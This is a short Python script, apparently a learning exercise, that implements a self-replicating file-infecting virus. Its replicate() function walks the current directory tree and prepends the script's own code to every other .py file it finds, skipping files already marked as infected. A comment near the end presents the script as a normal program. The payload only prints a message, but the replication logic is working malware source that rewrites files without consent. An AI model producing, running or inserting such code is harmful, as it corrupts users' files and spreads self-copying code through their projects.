#!/usr/bin/env python3
import os
import sys


# === PAYLOAD ===
def payload():
    print("!!! PAYLOAD TRIGGERED: File has been infected! !!!")


# === REPLICATION (INFECTION) LOGIC ===
def replicate():
    virus_code = get_own_code()

    for root, dirs, files in os.walk("."):
        for file_name in files:
            # Skip non-Python files, and skip ourselves to avoid infinite replication
            if not file_name.endswith(".py") or file_name == os.path.basename(__file__):
                continue

            file_path = os.path.join(root, file_name)
            # Read the target file
            with open(file_path, "r") as f:
                file_content = f.read()

            # Check if the file is already infected to avoid multiple infections
            if "!!! PAYLOAD TRIGGERED" not in file_content:
                # Prepend the virus code to the target file
                new_content = virus_code + "\n" + file_content
                # Write the new, infected content back to the file
                with open(file_path, "w") as f:
                    f.write(new_content)
                print(f"Infected: {file_path}")


# === HELPER FUNCTION ===
def get_own_code():

    this_file = sys.argv[0]
    with open(this_file, "r") as f:
        own_code = f.read()

    # Find the start of the payload function to avoid copying itself multiple times if run
    # This is a simple way to isolate the virus code.
    parts = own_code.split("def payload():")
    # Return the first part (the virus code) and the payload function definition
    for i in range(len(parts)):
        print(f"parts[{i}] = {parts[i]}")

    print("================")
    payload_part = parts[1].split("def replicate():")[0]
    payload_part = payload_part.rsplit("\n", 2)[0]
    # payload_part = payload_part.rsplit("\n", 1)[0]
    payload_part += "\npayload()"
    print("Payload:", f"'{payload_part}'")
    print("================")
    return parts[0] + "def payload():" + payload_part


if __name__ == "__main__":
    replicate()
    payload()

    # normal behavior, not suspicious.
    print("Hello from the original program!")
